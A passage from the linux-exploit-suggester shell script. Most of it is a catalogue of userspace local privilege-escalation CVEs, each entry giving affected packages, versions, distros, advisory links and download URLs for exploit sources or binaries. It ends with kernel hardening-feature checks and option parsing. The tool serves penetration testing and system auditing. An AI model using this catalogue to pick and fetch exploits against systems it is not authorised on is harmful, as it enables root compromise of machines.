Reqs: pkg=polkit,ver=0.96
Tags: RHEL=6,ubuntu=10.04|10.10
Rank: 1
exploit-db: 17942
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2011-2921]${txtrst} ktsuss
Reqs: pkg=ktsuss,ver<=1.4
Tags: sparky=5|6
Rank: 1
analysis-url: https://www.openwall.com/lists/oss-security/2011/08/13/2
src-url: https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2011-2921/ktsuss-lpe.sh
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2012-0809]${txtrst} death_star (sudo)
Reqs: pkg=sudo,ver>=1.8.0,ver<=1.8.3
Tags: fedora=16 
Rank: 1
analysis-url: http://seclists.org/fulldisclosure/2012/Jan/att-590/advisory_sudo.txt
exploit-db: 18436
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2014-0476]${txtrst} chkrootkit
Reqs: pkg=chkrootkit,ver<0.50
Tags: 
Rank: 1
analysis-url: http://seclists.org/oss-sec/2014/q2/430
exploit-db: 33899
Comments: Rooting depends on the crontab (up to one day of delay)
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2014-5119]${txtrst} __gconv_translit_find
Reqs: pkg=glibc|libc6,x86
Tags: debian=6
Rank: 1
analysis-url: http://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/34421.tar.gz
exploit-db: 34421
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-1862]${txtrst} newpid (abrt)
Reqs: pkg=abrt,cmd:grep -qi abrt /proc/sys/kernel/core_pattern
Tags: fedora=20
Rank: 1
analysis-url: http://openwall.com/lists/oss-security/2015/04/14/4
src-url: https://gist.githubusercontent.com/taviso/0f02c255c13c5c113406/raw/eafac78dce51329b03bea7167f1271718bee4dcc/newpid.c
exploit-db: 36746
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-3315]${txtrst} raceabrt
Reqs: pkg=abrt,cmd:grep -qi abrt /proc/sys/kernel/core_pattern
Tags: fedora=19{abrt:2.1.5-1.fc19},fedora=20{abrt:2.2.2-2.fc20},fedora=21{abrt:2.3.0-3.fc21},RHEL=7{abrt:2.1.11-12.el7}
Rank: 1
analysis-url: http://seclists.org/oss-sec/2015/q2/130
src-url: https://gist.githubusercontent.com/taviso/fe359006836d6cd1091e/raw/32fe8481c434f8cad5bcf8529789231627e5074c/raceabrt.c
exploit-db: 36747
author: Tavis Ormandy
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-1318]${txtrst} newpid (apport)
Reqs: pkg=apport,ver>=2.13,ver<=2.17,cmd:grep -qi apport /proc/sys/kernel/core_pattern
Tags: ubuntu=14.04
Rank: 1
analysis-url: http://openwall.com/lists/oss-security/2015/04/14/4
src-url: https://gist.githubusercontent.com/taviso/0f02c255c13c5c113406/raw/eafac78dce51329b03bea7167f1271718bee4dcc/newpid.c
exploit-db: 36746
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-1318]${txtrst} newpid (apport) 2
Reqs: pkg=apport,ver>=2.13,ver<=2.17,cmd:grep -qi apport /proc/sys/kernel/core_pattern
Tags: ubuntu=14.04.2
Rank: 1
analysis-url: http://openwall.com/lists/oss-security/2015/04/14/4
exploit-db: 36782
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-3202]${txtrst} fuse (fusermount)
Reqs: pkg=fuse,ver<2.9.3
Tags: debian=7.0|8.0,ubuntu=*
Rank: 1
analysis-url: http://seclists.org/oss-sec/2015/q2/520
exploit-db: 37089
Comments: Needs cron or system admin interaction
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-1815]${txtrst} setroubleshoot
Reqs: pkg=setroubleshoot,ver<3.2.22
Tags: fedora=21
Rank: 1
exploit-db: 36564
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-3246]${txtrst} userhelper
Reqs: pkg=libuser,ver<=0.60
Tags: RHEL=6{libuser:0.56.13-(4|5).el6},RHEL=6{libuser:0.60-5.el7},fedora=13|19|20|21|22
Rank: 1
analysis-url: https://www.qualys.com/2015/07/23/cve-2015-3245-cve-2015-3246/cve-2015-3245-cve-2015-3246.txt 
exploit-db: 37706
Comments: RHEL 5 is also vulnerable, but installed version of glibc (2.5) lacks functions needed by roothelper.c
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-5287]${txtrst} abrt/sosreport-rhel7
Reqs: pkg=abrt,cmd:grep -qi abrt /proc/sys/kernel/core_pattern
Tags: RHEL=7{abrt:2.1.11-12.el7}
Rank: 1
analysis-url: https://www.openwall.com/lists/oss-security/2015/12/01/1
src-url: https://www.openwall.com/lists/oss-security/2015/12/01/1/1
exploit-db: 38832
author: rebel
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-6565]${txtrst} not_an_sshnuke
Reqs: pkg=openssh-server,ver>=6.8,ver<=6.9
Tags:
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2017/01/26/2
exploit-db: 41173
author: Federico Bento
Comments: Needs admin interaction (root user needs to login via ssh to trigger exploitation)
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-8612]${txtrst} blueman set_dhcp_handler d-bus privesc
Reqs: pkg=blueman,ver<2.0.3
Tags: debian=8{blueman:1.23}
Rank: 1
analysis-url: https://twitter.com/thegrugq/status/677809527882813440
exploit-db: 46186
author: Sebastian Krahmer
Comments: Distros use own versioning scheme. Manual verification needed.
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-1240]${txtrst} tomcat-rootprivesc-deb.sh
Reqs: pkg=tomcat
Tags: debian=8,ubuntu=16.04
Rank: 1
analysis-url: https://legalhackers.com/advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html
src-url: http://legalhackers.com/exploits/tomcat-rootprivesc-deb.sh
exploit-db: 40450
author: Dawid Golunski
Comments: Affects only Debian-based distros
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-1247]${txtrst} nginxed-root.sh
Reqs: pkg=nginx|nginx-full,ver<1.10.3
Tags: debian=8,ubuntu=14.04|16.04|16.10
Rank: 1
analysis-url: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
src-url: https://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh
exploit-db: 40768
author: Dawid Golunski
Comments: Rooting depends on cron.daily (up to 24h of delay). Affected: deb8: <1.6.2; 14.04: <1.4.6; 16.04: 1.10.0; gentoo: <1.10.2-r3
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-1531]${txtrst} perl_startup (exim)
Reqs: pkg=exim,ver<4.86.2
Tags: 
Rank: 1
analysis-url: http://www.exim.org/static/doc/CVE-2016-1531.txt
exploit-db: 39549
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-1531]${txtrst} perl_startup (exim) 2
Reqs: pkg=exim,ver<4.86.2
Tags: 
Rank: 1
analysis-url: http://www.exim.org/static/doc/CVE-2016-1531.txt
exploit-db: 39535
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-4989]${txtrst} setroubleshoot 2
Reqs: pkg=setroubleshoot
Tags: RHEL=6|7
Rank: 1
analysis-url: https://c-skills.blogspot.com/2016/06/lets-feed-attacker-input-to-sh-c-to-see.html
src-url: https://github.com/stealth/troubleshooter/raw/master/straight-shooter.c
exploit-db:
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-5425]${txtrst} tomcat-RH-root.sh
Reqs: pkg=tomcat
Tags: RHEL=7
Rank: 1
analysis-url: http://legalhackers.com/advisories/Tomcat-RedHat-Pkgs-Root-PrivEsc-Exploit-CVE-2016-5425.html
src-url: http://legalhackers.com/exploits/tomcat-RH-root.sh
exploit-db: 40488
author: Dawid Golunski
Comments: Affects only RedHat-based distros
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-6663,CVE-2016-6664|CVE-2016-6662]${txtrst} mysql-exploit-chain
Reqs: pkg=mysql-server|mariadb-server,ver<5.5.52
Tags: ubuntu=16.04.1
Rank: 1
analysis-url: https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html
src-url: http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c
exploit-db: 40678
author: Dawid Golunski
Comments: Also MariaDB ver<10.1.18 and ver<10.0.28 affected
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-9566]${txtrst} nagios-root-privesc
Reqs: pkg=nagios,ver<4.2.4
Tags:
Rank: 1
analysis-url: https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html
src-url: https://legalhackers.com/exploits/CVE-2016-9566/nagios-root-privesc.sh
exploit-db: 40921
author: Dawid Golunski
Comments: Allows priv escalation from nagios user or nagios group
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-0358]${txtrst} ntfs-3g-modprobe
Reqs: pkg=ntfs-3g,ver<2017.4
Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
Rank: 1
analysis-url: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
exploit-db: 41356
author: Jann Horn
Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-5899]${txtrst} s-nail-privget
Reqs: pkg=s-nail,ver<14.8.16
Tags: ubuntu=16.04,manjaro=16.10
Rank: 1
analysis-url: https://www.openwall.com/lists/oss-security/2017/01/27/7
src-url: https://www.openwall.com/lists/oss-security/2017/01/27/7/1
ext-url: https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2017-5899/exploit.sh
author: wapiflapi (orginal exploit author); Brendan Coles (author of exploit update at 'ext-url')
Comments: Distros use own versioning scheme. Manual verification needed.
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-1000367]${txtrst} Sudoer-to-root
Reqs: pkg=sudo,ver<=1.8.20,cmd:[ -f /usr/sbin/getenforce ]
Tags: RHEL=7{sudo:1.8.6p7}
Rank: 1
analysis-url: https://www.sudo.ws/alerts/linux_tty.html
src-url: https://www.qualys.com/2017/05/30/cve-2017-1000367/linux_sudo_cve-2017-1000367.c
exploit-db: 42183
author: Qualys
Comments: Needs to be sudoer. Works only on SELinux enabled systems
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-1000367]${txtrst} sudopwn
Reqs: pkg=sudo,ver<=1.8.20,cmd:[ -f /usr/sbin/getenforce ]
Tags:
Rank: 1
analysis-url: https://www.sudo.ws/alerts/linux_tty.html
src-url: https://raw.githubusercontent.com/c0d3z3r0/sudo-CVE-2017-1000367/master/sudopwn.c
exploit-db:
author: c0d3z3r0
Comments: Needs to be sudoer. Works only on SELinux enabled systems
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-1000366,CVE-2017-1000370]${txtrst} linux_ldso_hwcap
Reqs: pkg=glibc|libc6,ver<=2.25,x86
Tags:
Rank: 1
analysis-url: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
src-url: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap.c
exploit-db: 42274
author: Qualys
Comments: Uses "Stack Clash" technique, works against most SUID-root binaries
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-1000366,CVE-2017-1000371]${txtrst} linux_ldso_dynamic
Reqs: pkg=glibc|libc6,ver<=2.25,x86
Tags: debian=9|10,ubuntu=14.04.5|16.04.2|17.04,fedora=23|24|25
Rank: 1
analysis-url: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
src-url: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_dynamic.c
exploit-db: 42276
author: Qualys
Comments: Uses "Stack Clash" technique, works against most SUID-root PIEs
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-1000366,CVE-2017-1000379]${txtrst} linux_ldso_hwcap_64
Reqs: pkg=glibc|libc6,ver<=2.25,x86_64
Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
Rank: 1
analysis-url: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
src-url: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
exploit-db: 42275
author: Qualys
Comments: Uses "Stack Clash" technique, works against most SUID-root binaries
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-1000370,CVE-2017-1000371]${txtrst} linux_offset2lib
Reqs: pkg=glibc|libc6,ver<=2.25,x86
Tags:
Rank: 1
analysis-url: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
src-url: https://www.qualys.com/2017/06/19/stack-clash/linux_offset2lib.c
exploit-db: 42273
author: Qualys
Comments: Uses "Stack Clash" technique
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2018-1000001]${txtrst} RationalLove
Reqs: pkg=glibc|libc6,ver<2.27,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1,x86_64
Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
Rank: 1
analysis-url: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
src-url: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
Comments: kernel.unprivileged_userns_clone=1 required
bin-url: https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/cve-2018-1000001/RationalLove
exploit-db: 43775
author: halfdog
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2018-10900]${txtrst} vpnc_privesc.py
Reqs: pkg=networkmanager-vpnc|network-manager-vpnc,ver<1.2.6
Tags: ubuntu=16.04{network-manager-vpnc:1.1.93-1},debian=9.0{network-manager-vpnc:1.2.4-4},manjaro=17
Rank: 1
analysis-url: https://pulsesecurity.co.nz/advisories/NM-VPNC-Privesc
src-url: https://bugzilla.novell.com/attachment.cgi?id=779110
exploit-db: 45313
author: Denis Andzakovic
Comments: Distros use own versioning scheme. Manual verification needed.
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2018-14665]${txtrst} raptor_xorgy
Reqs: pkg=xorg-x11-server-Xorg,cmd:[ -u /usr/bin/Xorg ]
Tags: centos=7.4
Rank: 1
analysis-url: https://www.securepatterns.com/2018/10/cve-2018-14665-xorg-x-server.html
exploit-db: 45922
author: raptor
Comments: X.Org Server before 1.20.3 is vulnerable. Distros use own versioning scheme. Manual verification needed.
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2019-7304]${txtrst} dirty_sock
Reqs: pkg=snapd,ver<2.37,cmd:[ -S /run/snapd.socket ]
Tags: ubuntu=18.10,mint=19
Rank: 1
analysis-url: https://initblog.com/2019/dirty-sock/
exploit-db: 46361
exploit-db: 46362
src-url: https://github.com/initstring/dirty_sock/archive/master.zip
author: InitString
Comments: Distros use own versioning scheme. Manual verification needed.
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2019-10149]${txtrst} raptor_exim_wiz
Reqs: pkg=exim|exim4,ver>=4.87,ver<=4.91
Tags:
Rank: 1
analysis-url: https://www.qualys.com/2019/06/05/cve-2019-10149/return-wizard-rce-exim.txt
exploit-db: 46996
author: raptor
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2019-12181]${txtrst} Serv-U FTP Server
Reqs: cmd:[ -u /usr/local/Serv-U/Serv-U ]
Tags: debian=9
Rank: 1
analysis-url: https://blog.vastart.dev/2019/06/cve-2019-12181-serv-u-exploit-writeup.html
exploit-db: 47009
src-url: https://raw.githubusercontent.com/guywhataguy/CVE-2019-12181/master/servu-pe-cve-2019-12181.c
ext-url: https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-12181/SUroot
author: Guy Levin (orginal exploit author); Brendan Coles (author of exploit update at 'ext-url')
Comments: Modified version at 'ext-url' uses bash exec technique, rather than compiling with gcc.
EOF
)
EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2019-18862]${txtrst} GNU Mailutils 2.0 <= 3.7 maidag url local root (CVE-2019-18862)
Reqs: cmd:[ -u /usr/local/sbin/maidag ]
Tags: 
Rank: 1
analysis-url: https://www.mike-gualtieri.com/posts/finding-a-decade-old-flaw-in-gnu-mailutils
ext-url: https://github.com/bcoles/local-exploits/raw/master/CVE-2019-18862/exploit.cron.sh
src-url: https://github.com/bcoles/local-exploits/raw/master/CVE-2019-18862/exploit.ldpreload.sh
author: bcoles
EOF
)

###########################################################
## security related HW/kernel features
###########################################################
n=0

FEATURES[((n++))]=$(cat <<EOF
section: Mainline kernel protection mechanisms:
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Kernel Page Table Isolation (PTI) support
available: ver>=4.15
enabled: cmd:grep -Eqi '\spti' /proc/cpuinfo
analysis-url: https://github.com/mzet-/les-res/blob/master/features/pti.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: GCC stack protector support
available: CONFIG_HAVE_STACKPROTECTOR=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/stackprotector-regular.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: GCC stack protector STRONG support
available: CONFIG_STACKPROTECTOR_STRONG=y,ver>=3.14
analysis-url: https://github.com/mzet-/les-res/blob/master/features/stackprotector-strong.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Low address space to protect from user allocation
available: CONFIG_DEFAULT_MMAP_MIN_ADDR=[0-9]+
enabled: sysctl:vm.mmap_min_addr!=0
analysis-url: https://github.com/mzet-/les-res/blob/master/features/mmap_min_addr.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Prevent users from using ptrace to examine the memory and state of their processes
available: CONFIG_SECURITY_YAMA=y
enabled: sysctl:kernel.yama.ptrace_scope!=0
analysis-url: https://github.com/mzet-/les-res/blob/master/features/yama_ptrace_scope.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Restrict unprivileged access to kernel syslog
available: CONFIG_SECURITY_DMESG_RESTRICT=y,ver>=2.6.37
enabled: sysctl:kernel.dmesg_restrict!=0
analysis-url: https://github.com/mzet-/les-res/blob/master/features/dmesg_restrict.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Randomize the address of the kernel image (KASLR)
available: CONFIG_RANDOMIZE_BASE=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/kaslr.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Hardened user copy support
available: CONFIG_HARDENED_USERCOPY=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/hardened_usercopy.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Make kernel text and rodata read-only
available: CONFIG_STRICT_KERNEL_RWX=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/strict_kernel_rwx.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Set loadable kernel module data as NX and text as RO
available: CONFIG_STRICT_MODULE_RWX=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/strict_module_rwx.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: BUG() conditions reporting
available: CONFIG_BUG=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/bug.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Additional 'cred' struct checks
available: CONFIG_DEBUG_CREDENTIALS=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/debug_credentials.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Sanity checks for notifier call chains
available: CONFIG_DEBUG_NOTIFIERS=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/debug_notifiers.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Extended checks for linked-lists walking
available: CONFIG_DEBUG_LIST=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/debug_list.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Checks on scatter-gather tables
available: CONFIG_DEBUG_SG=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/debug_sg.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Checks for data structure corruptions
available: CONFIG_BUG_ON_DATA_CORRUPTION=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/bug_on_data_corruption.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Checks for a stack overrun on calls to 'schedule'
available: CONFIG_SCHED_STACK_END_CHECK=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/sched_stack_end_check.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Freelist order randomization on new pages creation
available: CONFIG_SLAB_FREELIST_RANDOM=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/slab_freelist_random.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Freelist metadata hardening
available: CONFIG_SLAB_FREELIST_HARDENED=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/slab_freelist_hardened.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Allocator validation checking
available: CONFIG_SLUB_DEBUG_ON=y,cmd:! grep 'slub_debug=-' /proc/cmdline
analysis-url: https://github.com/mzet-/les-res/blob/master/features/slub_debug.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Virtually-mapped kernel stacks with guard pages
available: CONFIG_VMAP_STACK=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/vmap_stack.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Pages poisoning after free_pages() call
available: CONFIG_PAGE_POISONING=y
enabled: cmd: grep 'page_poison=1' /proc/cmdline
analysis-url: https://github.com/mzet-/les-res/blob/master/features/page_poisoning.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Using 'refcount_t' instead of 'atomic_t'
available: CONFIG_REFCOUNT_FULL=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/refcount_full.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Hardening common str/mem functions against buffer overflows
available: CONFIG_FORTIFY_SOURCE=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/fortify_source.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Restrict /dev/mem access
available: CONFIG_STRICT_DEVMEM=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/strict_devmem.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Restrict I/O access to /dev/mem
available: CONFIG_IO_STRICT_DEVMEM=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/io_strict_devmem.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
section: Hardware-based protection features:
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Supervisor Mode Execution Protection (SMEP) support
available: ver>=3.0
enabled: cmd:grep -qi smep /proc/cpuinfo
analysis-url: https://github.com/mzet-/les-res/blob/master/features/smep.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Supervisor Mode Access Prevention (SMAP) support
available: ver>=3.7
enabled: cmd:grep -qi smap /proc/cpuinfo
analysis-url: https://github.com/mzet-/les-res/blob/master/features/smap.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
section: 3rd party kernel protection mechanisms:
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Grsecurity
available: CONFIG_GRKERNSEC=y
enabled: cmd:test -c /dev/grsec
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: PaX
available: CONFIG_PAX=y
enabled: cmd:test -x /sbin/paxctl
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Linux Kernel Runtime Guard (LKRG) kernel module
enabled: cmd:test -d /proc/sys/lkrg
analysis-url: https://github.com/mzet-/les-res/blob/master/features/lkrg.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
section: Attack Surface:
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: User namespaces for unprivileged accounts
available: CONFIG_USER_NS=y
enabled: sysctl:kernel.unprivileged_userns_clone==1
analysis-url: https://github.com/mzet-/les-res/blob/master/features/user_ns.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Unprivileged access to bpf() system call
available: CONFIG_BPF_SYSCALL=y
enabled: sysctl:kernel.unprivileged_bpf_disabled!=1
analysis-url: https://github.com/mzet-/les-res/blob/master/features/bpf_syscall.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Syscalls filtering
available: CONFIG_SECCOMP=y
enabled: cmd:grep -i Seccomp /proc/self/status | awk '{print \$2}'
analysis-url: https://github.com/mzet-/les-res/blob/master/features/bpf_syscall.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Support for /dev/mem access
available: CONFIG_DEVMEM=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/devmem.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Support for /dev/kmem access
available: CONFIG_DEVKMEM=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/devkmem.md
EOF
)


version() {
    echo "linux-exploit-suggester "$VERSION", mzet, https://z-labs.eu, March 2019"
}

usage() {
    echo "Usage: linux-exploit-suggester.sh [OPTIONS]"
    echo
    echo " -V | --version               - print version of this script"
    echo " -h | --help                  - print this help"
    echo " -k | --kernel <version>      - provide kernel version"
    echo " -u | --uname <string>        - provide 'uname -a' string"
    echo " --skip-more-checks           - do not perform additional checks (kernel config, sysctl) to determine if exploit is applicable"
    echo " --skip-pkg-versions          - skip checking for exact userspace package version (helps to avoid false negatives)"
    echo " -p | --pkglist-file <file>   - provide file with 'dpkg -l' or 'rpm -qa' command output"
    echo " --cvelist-file <file>        - provide file with Linux kernel CVEs list"
    echo " --checksec                   - list security related features for your HW/kernel"
    echo " -s | --fetch-sources         - automatically downloads source for matched exploit"
    echo " -b | --fetch-binaries        - automatically downloads binary for matched exploit if available"
    echo " -f | --full                  - show full info about matched exploit"
    echo " -g | --short                 - show shorten info about matched exploit"
    echo " --kernelspace-only           - show only kernel vulnerabilities"
    echo " --userspace-only             - show only userspace vulnerabilities"
    echo " -d | --show-dos              - show also DoSes in results"
}

exitWithErrMsg() {
    echo "$1" 1>&2
    exit 1
}

# extracts all information from output of 'uname -a' command
parseUname() {
    local uname=$1

    KERNEL=$(echo "$uname" | awk '{print $3}' | cut -d '-' -f 1)
    KERNEL_ALL=$(echo "$uname" | awk '{print $3}')
    ARCH=$(echo "$uname" | awk '{print $(NF-1)}')

    OS=""
    echo "$uname" | grep -q -i 'deb' && OS="debian"
    echo "$uname" | grep -q -i 'ubuntu' && OS="ubuntu"
    echo "$uname" | grep -q -i '\-ARCH' && OS="arch"
    echo "$uname" | grep -q -i '\-deepin' && OS="deepin"
    echo "$uname" | grep -q -i '\-MANJARO' && OS="manjaro"
    echo "$uname" | grep -q -i '\.fc' && OS="fedora"
    echo "$uname" | grep -q -i '\.el' && OS="RHEL"
    echo "$uname" | grep -q -i '\.mga' && OS="mageia"

    # 'uname -a' output doesn't contain distribution number (at least not in case of all distros)
}

getPkgList() {
    local distro=$1
    local pkglist_file=$2
    
    # take package listing from provided file & detect if it's 'rpm -qa' listing or 'dpkg -l' or 'pacman -Q' listing of not recognized listing
    if [ "$opt_pkglist_file" = "true" -a -e "$pkglist_file" ]; then

        # ubuntu/debian package listing file
        if [ $(head -1 "$pkglist_file" | grep 'Desired=Unknown/Install/Remove/Purge/Hold') ]; then
            PKG_LIST=$(cat "$pkglist_file" | awk '{print $2"-"$3}' | sed 's/:amd64//g')

            OS="debian"
            [ "$(grep ubuntu "$pkglist_file")" ] && OS="ubuntu"
        # redhat package listing file
        elif [ "$(grep -E '\.el[1-9]+[\._]' "$pkglist_file" | head -1)" ]; then
            PKG_LIST=$(cat "$pkglist_file")
            OS="RHEL"
        # fedora package listing file
